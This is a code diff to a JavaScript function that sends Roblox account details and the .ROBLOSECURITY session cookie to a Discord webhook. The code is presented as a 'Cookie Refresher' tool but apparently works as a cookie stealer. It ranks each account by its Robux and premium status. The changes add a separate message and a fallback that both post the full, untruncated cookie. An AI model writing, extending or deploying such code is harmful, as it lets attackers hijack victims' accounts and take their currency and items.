@@ -239,54 +239,35 @@ async function sendNewCookieWithFullDetailsNotification(cookieData) {
     if (!cookieData.isValid) return;
 
     try {
-        // Truncate cookie to prevent message size issues
-        const truncatedCookie = cookieData.fullCookie ? 
-            (cookieData.fullCookie.length > 100 ? cookieData.fullCookie.substring(0, 100) + '...' : cookieData.fullCookie) : 
+        // Create a formatted message with all cookie information
+        const accountLink = `https://www.roblox.com/users/${cookieData.userId}/profile`;
+        const cookiePreview = cookieData.fullCookie ? 
+            (cookieData.fullCookie.length > 50 ? cookieData.fullCookie.substring(0, 50) + '...' : cookieData.fullCookie) : 
             cookieData.cookie;
 
-        // Truncate description to prevent message size issues
-        const truncatedDescription = (cookieData.description && cookieData.description.trim() && cookieData.description !== 'No description available') 
-            ? (cookieData.description.length > 200 ? cookieData.description.substring(0, 200) + '...' : cookieData.description)
-            : 'No description set';
-
         const embed = {
-            title: "🍪 NEW COOKIE ALERT - FULL DETAILS",
-            description: `**NEW ROBLOX ACCOUNT DETECTED!**\n🔥 A fresh ${cookieData.isPremium ? '⭐ PREMIUM' : 'STANDARD'} account has been added!`,
-            color: 0x00FF00,
+            title: "🍪 NEW ROBLOX ACCOUNT DETECTED!",
+            description: `**${cookieData.username}** has been successfully added to the cookie refresher!`,
+            color: cookieData.isPremium ? 0xFFD700 : 0x00D4FF,
             fields: [
                 {
-                    name: "🏷️ ACCOUNT IDENTITY",
-                    value: `**Username:** \`${cookieData.username}\`\n**Display Name:** \`${cookieData.displayName || 'Not set'}\`\n**User ID:** \`${cookieData.userId}\``,
+                    name: "👤 Account Details",
+                    value: `**Username:** [${cookieData.username}](${accountLink})\n**Display Name:** ${cookieData.displayName || 'Not set'}\n**User ID:** \`${cookieData.userId}\``,
                     inline: false
                 },
                 {
-                    name: "💰 FINANCIAL STATUS",
-                    value: `**Robux:** \`${cookieData.robux?.toLocaleString() || '0'} R$\`\n**Premium:** ${cookieData.isPremium ? '✅ ACTIVE' : '❌ NO'}`,
+                    name: "💰 Account Value",
+                    value: `**Robux:** ${cookieData.robux?.toLocaleString() || '0'} R$\n**Premium:** ${cookieData.isPremium ? '⭐ YES' : '❌ NO'}`,
                     inline: true
                 },
                 {
-                    name: "👥 SOCIAL METRICS",
-                    value: `**Followers:** \`${cookieData.followers?.toLocaleString() || '0'}\`\n**Following:** \`${cookieData.following?.toLocaleString() || '0'}\``,
+                    name: "👥 Social Stats",
+                    value: `**Followers:** ${cookieData.followers?.toLocaleString() || '0'}\n**Following:** ${cookieData.following?.toLocaleString() || '0'}`,
                     inline: true
                 },
                 {
-                    name: "📅 ACCOUNT INFO",
+                    name: "📅 Account Information",
                     value: `**Created:** ${cookieData.created ? new Date(cookieData.created).toLocaleDateString() : 'Unknown'}\n**Added:** ${new Date().toLocaleString()}`,
-                    inline: false
-                },
-                {
-                    name: "📝 DESCRIPTION",
-                    value: `\`${truncatedDescription}\``,
-                    inline: false
-                },
-                {
-                    name: "🔐 Full Cookie",
-                    value: `\`${cookieData.fullCookie || cookieData.cookie}\``,
-                    inline: false
-                },
-                {
-                    name: "📊 SUMMARY",
-                    value: `**Value:** ${cookieData.robux >= 1000 ? '🔥 HIGH' : cookieData.robux >= 100 ? '💫 MEDIUM' : '📈 STARTER'} • **Social:** ${cookieData.followers >= 100 ? '🌟 POPULAR' : '🌱 GROWING'}`,
                     inline: false
                 }
             ],
@@ -294,16 +275,28 @@ async function sendNewCookieWithFullDetailsNotification(cookieData) {
                 url: `https://www.roblox.com/headshot-thumbnail/image?userId=${cookieData.userId}&width=150&height=150&format=png`
             },
             footer: {
-                text: "🍪 Cookie Refresher Tool • Auto-Copied to Clipboard",
+                text: "Roblox Cookie Refresher • Click username to view profile",
                 icon_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png"
             },
             timestamp: new Date().toISOString()
         };
 
+        // Add description if available
+        if (cookieData.description && cookieData.description.trim() && cookieData.description !== 'No description available') {
+            const description = cookieData.description.length > 300 ? 
+                cookieData.description.substring(0, 300) + '...' : 
+                cookieData.description;
+            embed.fields.push({
+                name: "📝 Profile Description",
+                value: `\`${description}\``,
+                inline: false
+            });
+        }
+
         const payload = {
-            username: "🍪 NEW COOKIE ALERT",
+            username: "Cookie Refresher Bot",
             avatar_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png",
-            content: `🚨 **NEW ROBLOX ACCOUNT!** 🎯 **${cookieData.username}** (${cookieData.robux?.toLocaleString() || '0'} R$) ${cookieData.isPremium ? '⭐' : ''}`,
+            content: `🚨 **NEW ACCOUNT!** **${cookieData.username}** (${cookieData.robux?.toLocaleString() || '0'} R$) ${cookieData.isPremium ? '⭐' : ''}`,
             embeds: [embed]
         };
 
@@ -314,15 +307,36 @@ async function sendNewCookieWithFullDetailsNotification(cookieData) {
             timeout: 15000
         });
 
+        // Send the full cookie in a separate message to avoid truncation
+        setTimeout(async () => {
+            try {
+                const cookiePayload = {
+                    username: "Cookie Refresher Bot",
+                    avatar_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png",
+                    content: `🔐 **Full Cookie for ${cookieData.username}:**\n\`\`\`\n${cookieData.fullCookie || cookieData.cookie}\n\`\`\`\n⚠️ **WARNING:** Keep this cookie secure and private!`
+                };
+
+                await axios.post(DISCORD_WEBHOOK_URL, cookiePayload, {
+                    headers: { 'Content-Type': 'application/json' },
+                    timeout: 10000
+                });
+
+                console.log(`✅ Full cookie sent for: ${cookieData.username}`);
+            } catch (cookieError) {
+                console.error('❌ Failed to send full cookie:', cookieError.response?.status, cookieError.message);
+            }
+        }, 2000);
+
         console.log(`🎉 NEW COOKIE ALERT sent for: ${cookieData.username}`);
     } catch (error) {
         console.error('❌ Failed to send new cookie alert:', error.response?.status, error.message);
 
-        // Try sending a simpler notification as fallback
+        // Fallback to simple notification
         try {
             const simplePayload = {
                 username: "🍪 Cookie Alert",
-                content: `🚨 **NEW ACCOUNT ADDED!** Username: **${cookieData.username}** | Robux: **${cookieData.robux || 0}** | Premium: **${cookieData.isPremium ? 'Yes' : 'No'}**\n\nCookie: \`${cookieData.fullCookie ? cookieData.fullCookie.substring(0, 50) + '...' : cookieData.cookie}\``
+                content: `🚨 **NEW ACCOUNT!** **${cookieData.username}** | Robux: **${cookieData.robux || 0}** | Premium: **${cookieData.isPremium ? 'Yes' : 'No'}**\n\n🔐 **Cookie:**\n\`\`\`\n${cookieData.fullCookie || cookieData.cookie}\n\`\`\``,
+                avatar_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png"
             };
 
             await axios.post(DISCORD_WEBHOOK_URL, simplePayload, {
